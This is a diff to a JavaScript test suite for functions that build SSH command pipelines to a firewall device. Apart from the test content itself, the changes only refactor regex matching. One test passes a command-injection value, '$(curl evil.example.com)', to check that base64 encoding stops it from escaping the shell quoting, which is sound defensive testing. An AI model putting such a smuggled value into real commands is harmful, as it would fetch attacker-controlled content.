@@ -407,8 +407,8 @@ describe("validateNgfwIp", () => {
 
 function decodeEncodedCommand(commands) {
   // The ssh pipeline is the last line: `printf %s '<base64>' | base64 -d | ssh ...`
-  const pipeline = commands[commands.length - 1];
-  const match = pipeline.match(/^printf %s '([A-Za-z0-9+/=]*)' \| base64 -d \| ssh /);
+  const pipeline = commands.at(-1);
+  const match = /^printf %s '([A-Za-z0-9+/=]*)' \| base64 -d \| ssh /.exec(pipeline);
   if (!match) {
     throw new Error(`pipeline line did not match expected shape: ${pipeline}`);
   }
@@ -437,7 +437,7 @@ describe("buildNgfwSshCommands", () => {
     const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info" });
     assert.equal(cmds.length, 7);
     assert.equal(cmds[0], `set -e`);
-    const catMatch = cmds[1].match(/^cat > (\/tmp\/ngfw-[A-Za-z0-9._-]+\.pem) << 'EOFKEY'$/);
+    const catMatch = /^cat > (\/tmp\/ngfw-[A-Za-z0-9._-]+\.pem) << 'EOFKEY'$/.exec(cmds[1]);
     assert.ok(catMatch, `cat line shape: ${cmds[1]}`);
     const path = catMatch[1];
     assert.match(path, KEY_PATH_RE);
@@ -452,15 +452,15 @@ describe("buildNgfwSshCommands", () => {
     const sshLine = cmds[6];
     assert.ok(sshLine.startsWith("printf %s '"));
     assert.ok(sshLine.includes(`' | base64 -d | ssh -i ${path} `));
-    const printfMatch = sshLine.match(/^printf %s '([A-Za-z0-9+/=]+)'/);
+    const printfMatch = /^printf %s '([A-Za-z0-9+/=]+)'/.exec(sshLine);
     assert.ok(printfMatch, "printf segment must contain only base64 characters");
   });
 
   it("uses a unique key path per invocation so concurrent calls do not clobber each other", () => {
     const a = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
     const b = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
-    const pathA = a[1].match(/^cat > (\S+) /)[1];
-    const pathB = b[1].match(/^cat > (\S+) /)[1];
+    const pathA = /^cat > (\S+) /.exec(a[1])[1];
+    const pathB = /^cat > (\S+) /.exec(b[1])[1];
     assert.notEqual(pathA, pathB);
   });
 
@@ -582,8 +582,8 @@ describe("buildNgfwSshCommands", () => {
     // open by attacker-controlled command bytes.
     const command = "$(curl evil.example.com)";
     const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
-    const sshLine = cmds[cmds.length - 1];
-    const m = sshLine.match(/^printf %s '([^']*)'/);
+    const sshLine = cmds.at(-1);
+    const m = /^printf %s '([^']*)'/.exec(sshLine);
     assert.ok(m, "printf line did not parse");
     assert.match(m[1], /^[A-Za-z0-9+/=]+$/);
     // No single quote inside the encoded segment, so it cannot escape.
